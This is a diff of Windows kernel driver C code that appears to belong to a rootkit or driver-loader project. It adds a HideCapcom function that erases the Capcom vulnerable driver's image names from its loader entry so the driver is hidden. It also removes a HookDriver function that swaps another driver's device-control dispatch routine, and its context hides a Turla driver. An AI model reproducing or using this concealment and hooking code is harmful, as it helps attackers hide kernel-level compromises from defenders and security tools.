@@ -39,47 +39,47 @@ NTSTATUS HideTurla()
         Status = STATUS_NOT_FOUND;
     }
 
-    RtlFreeUnicodeString(&TurlaName);
-
     return Status;
 }
 
-// Hook the IRP_MJ_DEVICE_CONTROL routine of a target device
-NTSTATUS HookDriver(IN PWCHAR targetDeviceName)
+/// <summary>
+/// Hides the capcom driver
+/// </summary>
+NTSTATUS HideCapcom()
 {
-    NTSTATUS status = STATUS_SUCCESS;
+    NTSTATUS        Status = STATUS_SUCCESS;
+    UNICODE_STRING	CapcomName;
+    PDRIVER_OBJECT  Capcom;
 
-    UNICODE_STRING deviceName = { 0 };
-    PFILE_OBJECT pFileObj = NULL;
-    PDEVICE_OBJECT pDevObj = NULL;
+    RtlInitUnicodeString(&CapcomName, L"\\Driver\\Capcom");
 
-    RtlInitUnicodeString(&deviceName, targetDeviceName);
+    ObReferenceObjectByName(&CapcomName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID) &Capcom);
 
-    status = IoGetDeviceObjectPointer(&deviceName, FILE_READ_DATA, &pFileObj, &pDevObj);
+    if (Capcom)
+    {
+        const PKLDR_DATA_TABLE_ENTRY DriverSection = Capcom->DriverSection;
 
-    if (!NT_SUCCESS(status))
-        return status;
+        if (DriverSection)
+        {
+            DriverSection->FullImageName.Buffer[0] = L'\0';
+            DriverSection->FullImageName.Length = 0;
+            DriverSection->FullImageName.MaximumLength = 0;
 
-    g_HookCtx.pDrvObj = pDevObj->DriverObject;
-    g_HookCtx.pFileObj = pFileObj;
+            DriverSection->BaseImageName.Buffer[0] = L'\0';
+            DriverSection->BaseImageName.Length = 0;
+            DriverSection->BaseImageName.MaximumLength = 0;
+        }
+        else
+        {
+            Status = STATUS_UNSUCCESSFUL;
+        }
 
-    g_HookCtx.pOldHandler = g_HookCtx.pDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL];
-    g_HookCtx.pDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HookedDeviceControl;
+        ObDereferenceObject(Capcom);
+    }
+    else
+    {
+        Status = STATUS_NOT_FOUND;
+    }
 
-    //g_HookCtx.pOldHandler = (PDRIVER_DISPATCH)InterlockedExchange64(
-    //    (PLONG64)&g_HookCtx.pDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL],
-    //    (LONG64)&HookedDeviceControl);
-
-    g_HookCtx.IsHooked = TRUE;
-
-    return status;
+    return Status;
 }
-
-typedef struct _HOOK_DRIVER_CONTEXT
-{
-    PDRIVER_OBJECT pDrvObj;
-    PFILE_OBJECT pFileObj;
-    PDRIVER_DISPATCH pOldHandler; // Original IRP handler
-    BOOLEAN IsHooked;
-
-} HOOK_DRIVER_CONTEXT, *PHOOK_DRIVER_CONTEXT;
